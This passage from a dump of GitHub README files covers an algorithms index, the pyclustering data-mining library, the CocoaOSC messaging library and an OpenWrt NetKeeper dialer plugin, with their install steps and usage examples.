Tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/suffix_tree.h|\n|B-Tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/btree.h|\n|Suffix Array|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/suffix_array.h|\n|Hash by multiplication|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/hash_multi.h|\n|Hash table|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/hash_table.h|\n|Universal hash function|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/universal_hash.h|\n|Perfect hash|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/perfect_hash.h|\n|Java's string hash|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/hash_string.h|\n|FNV-1a string hash|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/hash_string.h|\n|SimHash|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/simhash.h|\n|Bloom Filter|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/bloom_filter.h|\n|SHA-1 Message Digest Algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/sha1.h|\n|MD5|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/md5.h|\n|Base64|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/base64.h|\n|Strongly Connected Components(SCC)|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/scc.h|\n|Prim's minimum spanning tree|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/prim_mst.h|\n|Kruskal MST|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/kruskal_mst.h|\n|Breadth First Search|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/graph_search.h|\n|Depth First Search|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/graph_search.h|\n|Dijkstra's algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/dijkstra.h|\n|Bellman-Ford algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/bellman_ford.h|\n|Edmonds-Karp Maximal Flow|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/edmonds_karp.h|\n|Push\u2013Relabel algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/relabel_to_front.h|\n|Huffman Coding|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/huffman.h|\n|Word segementation|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/word_seg.h|\n|A\\* algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/astar.h|\n|K-Means|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/k-means.h|\n|Knuth\u2013Morris\u2013Pratt algorithm|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/kmp.h|\n|Disjoint-Set|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/disjoint-set.h|\n|8-Queue Problem|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/8queen.h|\n|Palindrome|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/palindrome.h|\n|LCA using Binary Lifting|https:\/\/github.com\/xtaci\/algorithms\/blob\/master\/include\/LCA.h|\n\n#### \u8d21\u732e\u8005 ( Contributors ) :  \n    Samana:  for heavy work of MSVC compatability\n    wycg1984: for K-Means\n    xmuliang: for HeapSort, Kruskal MST\n    wyh267: for base64, LRU, bubble sort, selection sort\n    ZhangYou0122: Push-Relabel algorithm, Suffix Tree           \n    UsingtcNower: Suffix Array\n    afernandez90: AVL trees\n\n#### \u652f\u6301\u6b64\u9879\u76ee ( Donations ) :     \n![donate](donate_alg.png)          \n\u6b22\u8fce\u4f7f\u7528\u652f\u4ed8\u5b9d\u626b\u63cf\u4e0a\u9762\u7684\u4e8c\u7ef4\u7801\uff0c\u5bf9\u8be5\u9879\u76ee\u8fdb\u884c\u6350\u8d60\u3002\u6350\u8d60\u6b3e\u9879\u5c06\u7528\u4e8e\u6301\u7eed\u4f18\u5316\u8865\u5168\u53ca\u5b8c\u5584\u3002 \n"},{"repo":"\/annoviko\/pyclustering","language":"Python","readme_contents":"|Build Status Linux MacOS| |Build Status Win| |Coverage Status| |Documentation| |PyPi| |Download Counter| |JOSS|\n\nPyClustering\n============\n\n**pyclustering** is a Python, C++ data mining library (clustering\nalgorithm, oscillatory networks, neural networks). The library provides\nPython and C++ implementations (via CCORE library) of each algorithm or\nmodel. CCORE library is a part of pyclustering and supported only for\nLinux, Windows and MacOS operating systems.\n\n**Version**: 0.9.dev\n\n**License**: GNU General Public License\n\n**E-Mail**: pyclustering@yandex.ru\n\n**Documentation**: https:\/\/pyclustering.github.io\/docs\/0.9.2\/html\/index.html\n\n**Homepage**: https:\/\/pyclustering.github.io\/\n\n**PyClustering Wiki**: https:\/\/github.com\/annoviko\/pyclustering\/wiki\n\n\n\nDependencies\n============\n\n**Required packages**: scipy, matplotlib, numpy, Pillow\n\n**Python version**: >=3.5 (32-bit, 64-bit)\n\n**C++ version**: >= 14 (32-bit, 64-bit)\n\n\n\nPerformance\n===========\n\nEach algorithm is implemented using Python and C\/C++ language, if your platform is not supported then the Python\nimplementation is used, otherwise C\/C++. The implementation can be chosen by **ccore** flag (by default it is always\n'True' and it means that the C\/C++ implementation is used), for example:\n\n.. code:: python\n\n    # As by default - C\/C++ is used\n    xmeans_instance_1 = xmeans(data_points, start_centers, 20, ccore=True);\n\n    # The same - C\/C++ is used by default\n    xmeans_instance_2 = xmeans(data_points, start_centers, 20);\n\n    # Switch off core - Python is used\n    xmeans_instance_3 = xmeans(data_points, start_centers, 20, ccore=False);\n\n**ccore** option runs ccore shared library (core of the pyclustering library). The core is maintained for Linux, Windows and MacOS.\n\n\n\nInstallation\n============\n\nInstallation using pip3 tool:\n\n.. code:: bash\n\n    $ pip3 install pyclustering\n\nManual installation using GCC:\n\n.. code:: bash\n\n    # get sources of the pyclustering library, for example, from repository\n    $ mkdir pyclustering\n    $ cd pyclustering\/\n    $ git clone https:\/\/github.com\/annoviko\/pyclustering.git .\n\n    # compile CCORE library (core of the pyclustering library)\n    # you can specify platform (32-bit: 'ccore_32bit', 64-bit: 'ccore_64bit')\n    $ cd ccore\/\n    $ make ccore_64bit    # compile CCORE for 64-bit\n    # make ccore_32bit    # compile CCORE for 32-bit\n\n    # return to parent folder of the pyclustering library\n    cd ..\/\n\n    # add current folder to python path\n    PYTHONPATH=`pwd`\n    export PYTHONPATH=${PYTHONPATH}\n\nManual installation using Visual Studio:\n\n1. Clone repository from: https:\/\/github.com\/annoviko\/pyclustering.git\n2. Open folder pyclustering\/ccore\n3. Open Visual Studio project ccore.sln\n4. Select solution platform: 'x86' or 'x64'\n5. Build 'ccore' project.\n6. Add pyclustering folder to python path.\n\n\n\nProposals, Questions, Bugs\n==========================\n\nIn case of any questions, proposals or bugs related to the pyclustering please contact to pyclustering@yandex.ru or create an issue here.\n\n\n\nPyClustering Status\n===================\n\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Branch               | master                       | 0.9.dev                            | 0.9.2.rel                      |\n+======================+==============================+====================================+================================+\n| Build (Linux, MacOS) | |Build Status Linux MacOS|   | |Build Status Linux MacOS 0.9.dev| | |Build Status Linux 0.9.2.rel| |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Build (Win)          | |Build Status Win|           | |Build Status Win 0.9.dev|         | |Build Status Win 0.9.2.rel|   |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Code Coverage        | |Coverage Status|            | |Coverage Status 0.9.dev|          | |Coverage Status 0.9.2.rel|    |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n\n\n\nCite the Library\n================\n\nIf you are using pyclustering library in a scientific paper, please, cite the library:\n\nNovikov, A., 2019. PyClustering: Data Mining Library. Journal of Open Source Software, 4(36), p.1230. Available at: http:\/\/dx.doi.org\/10.21105\/joss.01230.\n\nBibTeX entry:\n\n.. code::\n\n    @article{Novikov2019,\n        doi         = {10.21105\/joss.01230},\n        url         = {https:\/\/doi.org\/10.21105\/joss.01230},\n        year        = 2019,\n        month       = {apr},\n        publisher   = {The Open Journal},\n        volume      = {4},\n        number      = {36},\n        pages       = {1230},\n        author      = {Andrei Novikov},\n        title       = {{PyClustering}: Data Mining Library},\n        journal     = {Journal of Open Source Software}\n    }\n\n\n\nBrief Overview of the Library Content\n=====================================\n\n**Clustering algorithms and methods (module pyclustering.cluster):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| Agglomerative          | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| BANG                   | \u2713       |     |\n+------------------------+---------+-----+\n| BIRCH                  | \u2713       |     |\n+------------------------+---------+-----+\n| BSAS                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CLARANS                | \u2713       |     |\n+------------------------+---------+-----+\n| CLIQUE                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CURE                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| DBSCAN                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Elbow                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| EMA                    | \u2713       |     |\n+------------------------+---------+-----+\n| Fuzzy C-Means          | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| GA (Genetic Algorithm) | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| G-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| HSyncNet               | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Means++              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Medians              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Medoids              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| MBSAS                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| OPTICS                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| ROCK                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Silhouette             | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| SOM-SC                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| SyncNet                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Sync-SOM               | \u2713       |     |\n+------------------------+---------+-----+\n| TTSAS                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| X-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n\n\n**Oscillatory networks and neural networks (module pyclustering.nnet):**\n\n+--------------------------------------------------------------------------------+---------+-----+\n| Model                                                                          | Python  | C++ |\n+================================================================================+=========+=====+\n| CNN (Chaotic Neural Network)                                                   | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| fSync (Oscillatory network based on Landau-Stuart equation and Kuramoto model) | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| HHN (Oscillatory network based on Hodgkin-Huxley model)                        | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| Hysteresis Oscillatory Network                                                 | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| LEGION (Local Excitatory Global Inhibitory Oscillatory Network)                | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| PCNN (Pulse-Coupled Neural Network)                                            | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SOM (Self-Organized Map)                                                       | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| Sync (Oscillatory network based on Kuramoto model)                             | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SyncPR (Oscillatory network for pattern recognition)                           | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SyncSegm (Oscillatory network for image segmentation)                          | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n\n\n**Graph Coloring Algorithms (module pyclustering.gcolor):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| DSatur                 | \u2713       |     |\n+------------------------+---------+-----+\n| Hysteresis             | \u2713       |     |\n+------------------------+---------+-----+\n| GColorSync             | \u2713       |     |\n+------------------------+---------+-----+\n\n\n**Containers (module pyclustering.container):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| KD Tree                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CF Tree                | \u2713       |     |\n+------------------------+---------+-----+\n\n\n\nExamples in the Library\n=======================\n\nThe library contains examples for each algorithm and oscillatory network model:\n\n**Clustering examples:** ``pyclustering\/cluster\/examples``\n\n**Graph coloring examples:** ``pyclustering\/gcolor\/examples``\n\n**Oscillatory network examples:** ``pyclustering\/nnet\/examples``\n\n.. image:: https:\/\/github.com\/annoviko\/pyclustering\/blob\/master\/docs\/img\/example_cluster_place.png\n   :alt: Where are examples?\n\n\n\nCode Examples\n=============\n\n**Data clustering by CURE algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer;\n    from pyclustering.cluster.cure import cure;\n    from pyclustering.utils import read_sample;\n    from pyclustering.samples.definitions import FCPS_SAMPLES;\n\n    # Input data in following format [ [0.1, 0.5], [0.3, 0.1], ... ].\n    input_data = read_sample(FCPS_SAMPLES.SAMPLE_LSUN);\n\n    # Allocate three clusters.\n    cure_instance = cure(input_data, 3);\n    cure_instance.process();\n    clusters = cure_instance.get_clusters();\n\n    # Visualize allocated clusters.\n    visualizer = cluster_visualizer();\n    visualizer.append_clusters(clusters, input_data);\n    visualizer.show();\n\n**Data clustering by K-Means algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster.kmeans import kmeans, kmeans_visualizer\n    from pyclustering.cluster.center_initializer import kmeans_plusplus_initializer\n    from pyclustering.samples.definitions import FCPS_SAMPLES\n    from pyclustering.utils import read_sample\n\n    # Load list of points for cluster analysis.\n    sample = read_sample(FCPS_SAMPLES.SAMPLE_TWO_DIAMONDS)\n\n    # Prepare initial centers using K-Means++ method.\n    initial_centers = kmeans_plusplus_initializer(sample, 2).initialize()\n\n    # Create instance of K-Means algorithm with prepared centers.\n    kmeans_instance = kmeans(sample, initial_centers)\n\n    # Run cluster analysis and obtain results.\n    kmeans_instance.process()\n    clusters = kmeans_instance.get_clusters()\n    final_centers = kmeans_instance.get_centers()\n\n    # Visualize obtained results\n    kmeans_visualizer.show_clusters(sample, clusters, final_centers)\n\n**Data clustering by OPTICS algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer\n    from pyclustering.cluster.optics import optics, ordering_analyser, ordering_visualizer\n    from pyclustering.samples.definitions import FCPS_SAMPLES\n    from pyclustering.utils import read_sample\n\n    # Read sample for clustering from some file\n    sample = read_sample(FCPS_SAMPLES.SAMPLE_LSUN)\n\n    # Run cluster analysis where connectivity radius is bigger than real\n    radius = 2.0\n    neighbors = 3\n    amount_of_clusters = 3\n    optics_instance = optics(sample, radius, neighbors, amount_of_clusters)\n\n    # Performs cluster analysis\n    optics_instance.process()\n\n    # Obtain results of clustering\n    clusters = optics_instance.get_clusters()\n    noise = optics_instance.get_noise()\n    ordering = optics_instance.get_ordering()\n\n    # Visualize ordering diagram\n    analyser = ordering_analyser(ordering)\n    ordering_visualizer.show_ordering_diagram(analyser, amount_of_clusters)\n\n    # Visualize clustering results\n    visualizer = cluster_visualizer()\n    visualizer.append_clusters(clusters, sample)\n    visualizer.show()\n\n**Simulation of oscillatory network PCNN**\n\n.. code:: python\n\n    from pyclustering.nnet.pcnn import pcnn_network, pcnn_visualizer\n\n    # Create Pulse-Coupled neural network with 10 oscillators.\n    net = pcnn_network(10)\n\n    # Perform simulation during 100 steps using binary external stimulus.\n    dynamic = net.simulate(50, [1, 1, 1, 0, 0, 0, 0, 1, 1, 1])\n\n    # Allocate synchronous ensembles from the output dynamic.\n    ensembles = dynamic.allocate_sync_ensembles()\n\n    # Show output dynamic.\n    pcnn_visualizer.show_output_dynamic(dynamic, ensembles)\n\n**Simulation of chaotic neural network CNN**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer\n    from pyclustering.samples.definitions import SIMPLE_SAMPLES\n    from pyclustering.utils import read_sample\n    from pyclustering.nnet.cnn import cnn_network, cnn_visualizer\n\n    # Load stimulus from file.\n    stimulus = read_sample(SIMPLE_SAMPLES.SAMPLE_SIMPLE3)\n\n    # Create chaotic neural network, amount of neurons should be equal to amount of stimulus.\n    network_instance = cnn_network(len(stimulus))\n\n    # Perform simulation during 100 steps.\n    steps = 100\n    output_dynamic = network_instance.simulate(steps, stimulus)\n\n    # Display output dynamic of the network.\n    cnn_visualizer.show_output_dynamic(output_dynamic)\n\n    # Display dynamic matrix and observation matrix to show clustering phenomenon.\n    cnn_visualizer.show_dynamic_matrix(output_dynamic)\n    cnn_visualizer.show_observation_matrix(output_dynamic)\n\n    # Visualize clustering results.\n    clusters = output_dynamic.allocate_sync_ensembles(10)\n    visualizer = cluster_visualizer()\n    visualizer.append_clusters(clusters, stimulus)\n    visualizer.show()\n\n\n\nIllustrations\n=============\n\n**Cluster allocation on FCPS dataset collection by DBSCAN:**\n\n.. image:: https:\/\/github.com\/annoviko\/pyclustering\/blob\/master\/docs\/img\/fcps_cluster_analysis.png\n   :alt: Clustering by DBSCAN\n\n**Cluster allocation by OPTICS using cluster-ordering diagram:**\n\n.. image:: https:\/\/github.com\/annoviko\/pyclustering\/blob\/master\/docs\/img\/optics_example_clustering.png\n   :alt: Clustering by OPTICS\n\n\n**Partial synchronization (clustering) in Sync oscillatory network:**\n\n.. image:: https:\/\/github.com\/annoviko\/pyclustering\/blob\/master\/docs\/img\/sync_partial_synchronization.png\n   :alt: Partial synchronization in Sync oscillatory network\n\n\n**Cluster visualization by SOM (Self-Organized Feature Map)**\n\n.. image:: https:\/\/github.com\/annoviko\/pyclustering\/blob\/master\/docs\/img\/target_som_processing.png\n   :alt: Cluster visualization by SOM\n\n\n\n.. _scikit-learn: https:\/\/scikit-learn.org\/stable\/\n.. _ELKI: https:\/\/elki-project.github.io\/\n\n.. |Build Status Linux MacOS| image:: https:\/\/travis-ci.org\/annoviko\/pyclustering.svg?branch=master\n   :target: https:\/\/travis-ci.org\/annoviko\/pyclustering\n.. |Build Status Win| image:: https:\/\/ci.appveyor.com\/api\/projects\/status\/4uly2exfp49emwn0\/branch\/master?svg=true\n   :target: https:\/\/ci.appveyor.com\/project\/annoviko\/pyclustering\/branch\/master\n.. |Coverage Status| image:: https:\/\/coveralls.io\/repos\/github\/annoviko\/pyclustering\/badge.svg?branch=master&ts=1\n   :target: https:\/\/coveralls.io\/github\/annoviko\/pyclustering?branch=master\n.. |Documentation| image:: https:\/\/codedocs.xyz\/annoviko\/pyclustering.svg\n   :target: https:\/\/codedocs.xyz\/annoviko\/pyclustering\/\n.. |DOI| image:: https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.1491324.svg\n   :target: https:\/\/doi.org\/10.5281\/zenodo.1491324\n.. |PyPi| image:: https:\/\/badge.fury.io\/py\/pyclustering.svg\n   :target: https:\/\/badge.fury.io\/py\/pyclustering\n.. |Build Status Linux MacOS 0.9.dev| image:: https:\/\/travis-ci.org\/annoviko\/pyclustering.svg?branch=0.9.dev\n   :target: https:\/\/travis-ci.org\/annoviko\/pyclustering\n.. |Build Status Win 0.9.dev| image:: https:\/\/ci.appveyor.com\/api\/projects\/status\/4uly2exfp49emwn0\/branch\/0.9.dev?svg=true\n   :target: https:\/\/ci.appveyor.com\/project\/annoviko\/pyclustering\/branch\/0.9.dev\n.. |Coverage Status 0.9.dev| image:: https:\/\/coveralls.io\/repos\/github\/annoviko\/pyclustering\/badge.svg?branch=0.9.dev&ts=1\n   :target: https:\/\/coveralls.io\/github\/annoviko\/pyclustering?branch=0.9.dev\n.. |Build Status Linux 0.9.2.rel| image:: https:\/\/travis-ci.org\/annoviko\/pyclustering.svg?branch=0.9.2.rel\n   :target: https:\/\/travis-ci.org\/annoviko\/pyclustering\n.. |Build Status Win 0.9.2.rel| image:: https:\/\/ci.appveyor.com\/api\/projects\/status\/4uly2exfp49emwn0\/branch\/0.9.2.rel?svg=true\n   :target: https:\/\/ci.appveyor.com\/project\/annoviko\/pyclustering\/branch\/0.9.2.rel\n.. |Coverage Status 0.9.2.rel| image:: https:\/\/coveralls.io\/repos\/github\/annoviko\/pyclustering\/badge.svg?branch=0.9.2.rel&ts=1\n   :target: https:\/\/coveralls.io\/github\/annoviko\/pyclustering?branch=0.9.2.rel\n.. |Download Counter| image:: https:\/\/pepy.tech\/badge\/pyclustering\n   :target: https:\/\/pepy.tech\/project\/pyclustering\n.. |JOSS| image:: http:\/\/joss.theoj.org\/papers\/10.21105\/joss.01230\/status.svg\n   :target: https:\/\/doi.org\/10.21105\/joss.01230"},{"repo":"\/danieldickison\/CocoaOSC","language":"HTML","readme_contents":"CocoaOSC\n========\n\nThis is an Objective-C library for sending and receiving [Open Sound Control 1.0][osc] (OSC) messages over UDP or TCP.  The purpose of OSC was originally to be a modern replacement for the MIDI protocol in electronic music contexts, but it is also useful outside of music for providing a simple and way of serializing and routing arbitrary messages between multiple processes.\n\nPlease consider this library a work in progress.  In particular, OSC bundles are currently not supported.\n\n[osc]: http:\/\/opensoundcontrol.org\/spec-1_0\n\nLicense\n-------\n\nCopyright (c) 2012, Daniel Dickison\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and\/or other materials provided with the distribution.\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"},{"repo":"\/miao1007\/Openwrt-NetKeeper","language":"C++","readme_contents":"# Openwrt-NetKeeper \u95ea\u8baf\u62e8\u53f7for OpenWrt\n\n\n### \u7b80\u8ff0\n\n\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8eOpenWRT\u7684\u95ea\u8baf\u62e8\u53f7\u7b97\u6cd5\u7684\u5b9e\u73b0\u3002\u901a\u8fc7\u5bf9Android\u7248\u7684\u53cd\u7f16\u8bd1\uff0c\u83b7\u5f97\u5230\u4e86\u62e8\u53f7\u6d41\u7a0b\uff0c\u5e76\u628a\u5b83\u79fb\u690d\u5230OpenWRT\u4e0a\u8fd0\u884c\uff0c~~\u5b9e\u73b0\u6253\u7834\u6bd2\u7624\u7535\u4fe1\u5784\u65ad\u7684\u6548\u679c~~\u3002\n\n\u8bba\u575b\u89c1[\u8fd9\u91cc](http:\/\/www.right.com.cn\/forum\/thread-141979-1-1.html)\n\n~~QQ\u7fa4\u5728\u8fd9\u91cc495772016~~\n\n\n\u5fc3\u8df3\u5df2\u7ecf\u901a\u8fc7Android\u7248\u53cd\u7f16\u8bd1\u51fa\u6765\u4e86\uff0c\u4e0d\u8fc7\u5e94\u8be5\u662f\u70c2\u5c3e\u4e86\uff0c\u627e\u5de5\u4f5c\u6ca1\u65f6\u95f4\u79fb\u690d\u4e86\uff08\u7528\u811a\u672c\u8bed\u8a00\u53d1\u5957\u63a5\u5b57\u5c31\u53ef\u4ee5\uff09.... <https:\/\/github.com\/miao1007\/android-netkeeper>\n\n\n### \u5de5\u4f5c\u539f\u7406\n![How does it work](mdassets\/hownetkeeperwork.png)\n\n### \u652f\u6301\u5730\u533a\n1. \u6b66\u6c49E\u4fe1\n2. \u91cd\u5e86\n3. \u676d\u5dde\n4. \u5357\u660c(V18~V32)\n5. \u6d77\u5357\n6. \u9752\u6d77\/\u65b0\u7586\n7. \u6cb3\u5317\n8. \u5c71\u4e1c\u79fb\u52a8\n\n\u67e5\u770b\u66f4\u591a\uff1a [supported radius](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/blob\/master\/src\/makefile#L10)\n\n### \u7279\u6027\n1. \u7b97\u6cd5\u975e\u5e38\u6709\u6548\u7387\uff0c\u57fa\u4e8e\u4f4d\u8fd0\u884c\u4f18\u5316\uff0c\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e5f\u80fd\u8f7b\u677e\u8fd0\u884c\uff1b\n2. \u53ef\u79fb\u690d\u5f3a\uff0c\u4ec5\u6709\u7684\u51e0\u4e2a\u5e93\u6587\u4ef6\u5728\u4efb\u4f55\u8bbe\u5907\u5747\u53ef\u4f7f\u7528\uff1b\n3. \u81ea\u9002\u5e94\u5e10\u53f7\u957f\u5ea6\uff0c\u652f\u6301\u5e26\u540e\u7f00\u4e0e\u4e0d\u5e26\u540e\u7f00\u7684\u8fd0\u7b97\uff1b\n4. \u652f\u6301\u539f\u5382OpenWrt\u3001PandoraBox\uff08\u4f46\u5e76\u4e0d\u63a8\u8350\uff09\u3002\n\n\n## \u5982\u4f55\u4f7f\u7528\n\n\n#### 1. \u4e0b\u8f7d\u6700\u65b0\u7248\u63d2\u4ef6\n\n1. [sxplugin.so](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/releases)\n2. [confnetwork.sh](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/blob\/master\/src\/confnetwork.sh)\n \n\u4e0b\u8f7d\u540e\uff0c\u4fee\u6539`confnetwork.sh`\u4e2d\u7684 `pppd_options` `username ` `password ` \n\n\n\n#### 2. \u4e0a\u4f20\n\u4f7f\u7528scp(windows\u4e0b\u53ef\u4ee5\u4f7f\u7528 [WinScp](https:\/\/winscp.net\/download\/winscp576.zip)) \u4e0a\u4f20\n\n```\nyourprovince_sxplugin.so -> \/usr\/lib\/pppd\/2.4.7\/\nconfnetwork.sh -> \/tmp\/\n```\n\n#### 3. \u914d\u7f6e\u8def\u7531\u5668\n\u767b\u9646\u8def\u7531\u5668\uff0c\u6267\u884c\u811a\u672c\n\n```\nchmod a+x \/tmp\/confnetwork.sh\nsh \/tmp\/confnetwork.sh \n```\n\n\u6700\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u540c\u6b65\u4e00\u4e0b\u8def\u7531\u5668\u65f6\u95f4\u5e76\u91cd\u8fde\u4e00\u4e0b\u95ea\u8baf(netkeeper)\n\n\n\n\n## \u5f00\u53d1\n\u4ee5\u4e0b\u9700\u8981\u4e86\u89e3\u5f00\u53d1\u76f8\u5173\u6280\u672f\n\n### 1. \u7528\u6e90\u7801\u8fdb\u884c\u7f16\u8bd1\n\n\u9996\u5148\u4f60\u8981\u51c6\u5907\u4e00\u4e2aUbuntu\u7684\u865a\u62df\u673a(recommend [14.04](http:\/\/releases.ubuntu.com\/14.04\/)) \u4f5c\u4e3a\u5f00\u53d1\u4f9d\u8d56\n\n#### 1.1. \u514b\u9686\u4ee3\u7801\n\n```\ngit clone --depth=1 https:\/\/github.com\/miao1007\/Openwrt-NetKeeper.git\n```\n\n#### 1.2. \u4e0b\u8f7dToolchain\n\n\u76f4\u63a5\u4e0b\u8f7d\u6700\u65b0\u7684[Toolchain](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/wiki#2-%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BDgcc)\n\t\n\u6216\u8005\u7528\u547d\u4ee4\u4e0b\u8f7d\n\t\n```\n#this is a sample for mipsel(Little Endian) device\nwget https:\/\/downloads.openwrt.org\/barrier_breaker\/14.07\/ramips\/mt7620a\/OpenWrt-Toolchain-ramips-for-mipsel_24kec%2bdsp-gcc-4.8-linaro_uClibc-0.9.33.2.tar.bz2 | tar -xjf \n```\n\n#### 1.3. \u914d\u7f6e\n\n\u4ed4\u7ec6\u9605\u8bfb `makefile` \u4e0e `confnetwork.sh` \u4e2d\u7684 **TODO**\n\n#### 1.4. \u7f16\u8bd1\n\t\n\n```\ncd Openwrt-NetKeeper\/src\/\nmake all\n```\n\n### 2. \u914d\u7f6e\u8def\u7531\u5668\n\n\u4f7f\u7528\u6b64\u811a\u672c\u81ea\u52a8\u914d\u7f6e\u8def\u7531\u5668\n\n```\nmake upload\n```\n\n## \u7591\u96be\u95ee\u9898\n\n1. \u8bf7\u5148\u5728[wiki](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/wiki)\u4e2d\u67e5\u627e\u7b54\u6848\n2. \u63d0\u4ea4\u65b0\u7684[issue](https:\/\/github.com\/miao1007\/Openwrt-NetKeeper\/issues\/new) \uff08\u8bf7\u9644\u4e0a\u7cfb\u7edf\u65e5\u5fd7\uff09\n\n\n## \u611f\u8c22\n* [NETKEEPER ON WINDOWS](http:\/\/www.purpleroc.com\/html\/507231.html)\n* [CQUPT NETKEEPER](http:\/\/bbs.cqupt.edu.cn\/nForum\/#!article\/Unix_Linux\/13624)\n* 